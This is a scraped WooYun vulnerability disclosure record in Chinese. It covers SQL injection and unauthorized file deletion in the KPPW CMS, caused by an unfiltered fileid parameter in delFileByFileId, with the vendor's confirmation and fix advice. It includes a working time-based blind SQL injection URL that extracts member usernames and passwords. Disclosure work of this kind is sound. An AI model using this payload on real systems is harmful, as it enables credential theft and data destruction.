{"id": 42118, "wybug_id": "wooyun-2014-086721", "wybug_title": "KPPW最新版SQL注入漏洞八(全局问题导致12处注入及越权操作)", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-11 12:14", "wybug_open_date": "2015-03-11 12:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-11：\t细节向公众公开  简要描述： KPPW最新版SQL注入漏洞八，从一处问题找出罪魁祸首，全局文件问题导致12处注入及越权操作 详细说明：  KPPW最新版SQL注入漏洞八，从一处问题找出罪魁祸首，全局文件问题导致12处注入及越权操作文件/control/pubgoods.php\n<?phpkekezu::check_login();$strPageTitle = '发布商品-'.$_K ['html_title'];$strPageKeyword = '发布商品,'.$_K ['html_title'];$strPageDescription = $kekezu->_sys_config['index_seo_desc'];$id = intval($id);$step = strval(trim($step));......$strUrl = \"index.php?do=pubgoods&id=\".$id;$_SESSION['spread'] = 'index.php?do=pubgoods';require S_ROOT . \"/shop/\" . $arrModelInfo['model_dir'] . \"/control/pub.php\";\n看最后两行，这里的$arrModelInfo['model_dir']可以为goods或者service当$arrModelInfo['model_dir']为goods时，我们跟进文件：/shop/goods/control/pub.php\n<?php defined ( 'IN_KEKE' ) or exit ( 'Access Denied' );$stdCacheName = 'service_cache_'.$id.'_' . substr ( md5 ( $gUid ), 0, 6 );$objRelease = goods_release_class::get_instance ($id);$objRelease->get_service_obj ( $stdCacheName ); $arrPubInfo = $objRelease->_std_obj->_release_info; $arrConfig = $objRelease->_service_config; $arrPubInfo['indus_pid'] and $arrAllIndustrys = CommonClass::getIndustryByPid($arrPubInfo['indus_pid'],'indus_id,indus_pid,indus_name');switch ($step) {\tcase 'step1':......if($action == 'delete_image'){\t\t\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileid);\t\t\t$arrFileInfo = db_factory::get_one($strSql);\t\t\t$resText = CommonClass::delFileByFileId($fileid);\t\t\tif($resText){\t\t\t\t$array = explode(',', $arrPubInfo['file_ids']);\t\t\t\t$newArr = CommonClass::returnNewArr($arrFileInfo['save_name'], $array);\t\t\t\t$_POST['file_ids'] = implode(\",\", $newArr);\t\t\t\t$arrPubInfo and $_POST = array_merge ( $arrPubInfo, $_POST);\t\t\t\t$objRelease->save_service_obj ($_POST, $stdCacheName ); \t\t\t\tkekezu::echojson('删除成功',1,array('fileid'=>$fileid,'save_name'=>$arrFileInfo['save_name']));die;\t\t\t}\t\t}\t\tif($action == 'delete_goodsfile'){\t\t\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileid);\t\t\t$arrFileInfo = db_factory::get_one($strSql);\t\t\t$resText = CommonClass::delFileByFileId($fileid);\n当action=delete_image，或者action=delete_goodsfile时，参数fileid都会进入sql语句，而且没有过滤，没有引号保护，最后导致sql注入继续往下，参数fileid还进入了函数delFileByFileId，继续跟踪：文件/lib/inc/CommonClass.php：\npublic static function delFileByFileId($fileId){\t\t$strSql = sprintf(\"select file_id,file_name,save_name from %switkey_file where file_id in(%s)\",TABLEPRE,$fileId);\t\t$arrFileInfo = db_factory::get_one($strSql);\t\t$filename = S_ROOT.$arrFileInfo['save_name'];\t\tif(file_exists($filename)){\t\t\tunlink($filename);\t\t}\t\treturn db_factory::execute(\"delete from \".TABLEPRE.\"witkey_file where file_id = \".$fileId);\t}\n这里的fileid同样进入了select和delete语句，都没有过滤处理和保护，导致两处注入这里在delete时，可以删除用户发布的商品或者任务的图片已经文件，而且这里最后删除时只根据fileid删除，没有判断删除对象的用户属性，导致可以任意删除任意用户发布的文件，导致越权操作。下面来看看文件/lib/inc/CommonClass.php，这是一个全局调用的函数来看看有多少文件使用了/lib/inc/CommonClass.php中的这个delFileByFileId函数\n\n可以看到这里一个有12个文件使用了这个delFileByFileId函数，我们再来找两个其他文件，看看是不是也没有处理传入delFileByFileId函数的fileid参数第一个文件/control/taskhandle.php：\ncase 'workover':\t\tif (isset($formhash)&&kekezu::submitcheck($formhash)){\t\t\t$resText = $objTask->work_over($tarContent, $file_id,intval($modify));\t\t\tif($resText === true){\t\t\t\tkekezu::show_msg ( '操作成功', 'index.php?do=task&id='.$taskId, 3, NULL, 'ok' );\t\t\t}else{\t\t\t\tkekezu::show_msg ( $resText, 'index.php?do=task&id='.$taskId, 3, NULL, 'fail' );\t\t\t}\t\t}\t\tif($action == 'deleteFile'){\t\t\t$resText = CommonClass::delFileByFileId($fileid);\t\t\tif($resText){\t\t\t\tkekezu::echojson('删除成功',1,array('fileid'=>$fileid));die;\t\t\t}\t\t}\nfileid在全文上下没有处理，这里进入函数delFileByFileId后，也会导致注入其他的就不一一列出来了，都存在同样的问题fileid没有处理，直接进入函数delFileByFileId，然后fileid进入select和delete语句，导致sql注入，并且存在越权删除任意用户文件的漏洞   漏洞证明：  sql注入漏洞：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=pubgoods&step=step1&action=delete_image&fileid=5566)+and+1=if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)=char(97),sleep(5),2)%23\n这里会延迟10秒返回因为这里的存在两处select，所以sleep(5)了两次\n\n看看数据库执行结果：\n\n成功执行我们的sql语句这里说UserName+password的第一个字符是a，继续执行，即可注入出完整的UserName和password，注入脚本之前已经有了，修改下请求即可   修复方案：  在fileid 进入sql语句之前加intval或者单引号保护即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-11 13:11 厂商回复： 已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-11 12:26 |    \t\tdiguoji \t\t\t( 普通白帽子  |\t\t\t        Rank:323 漏洞数:79        | 中国吉林长春)\t\t \n  天天都这么狠    \n     2014-12-11 13:38 |    \t\t鶆鶈 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:30        )\t\t \n  为什么这么牛必。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}